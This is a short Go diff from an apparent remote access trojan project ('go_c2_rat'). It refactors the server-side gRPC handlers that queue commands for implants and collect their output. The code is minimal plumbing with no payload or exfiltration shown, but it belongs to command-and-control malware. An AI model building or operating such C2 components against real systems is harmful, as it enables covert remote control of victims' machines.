@@ -1,10 +1,10 @@
-package implant
+package server
 
 import (
 	"context"
 	"errors"
 
-	"github.com/jonaserhart/go_c2_rat/pkg/pb"
+	"github.com/jonaserhart/go_c2_rat/pb"
 )
 
 type implantServer struct {
@@ -16,10 +16,10 @@ func NewImplantserver(work, output chan *pb.Command) *implantServer {
 	return &implantServer{work: work, output: output}
 }
 
-func (s *implantServer) FetchCommand(ctx context.Context, empty *pb.Empty) (*pb.Command, error) {
+func (i implantServer) FetchCommand(ctx context.Context, empty *pb.Empty) (*pb.Command, error) {
 	cmd := new(pb.Command)
 	select {
-	case cmd, ok := <-s.work:
+	case cmd, ok := <-i.work:
 		if ok {
 			return cmd, nil
 		}
@@ -29,7 +29,7 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *pb.Empty) (*pb.
 	}
 }
 
-func (s *implantServer) SendOutput(ctx context.Context, result *pb.Command) (*pb.Empty, error) {
-	s.output <- result
+func (i implantServer) SendOutput(ctx context.Context, result *pb.Command) (*pb.Empty, error) {
+	i.output <- result
 	return &pb.Empty{}, nil
 }
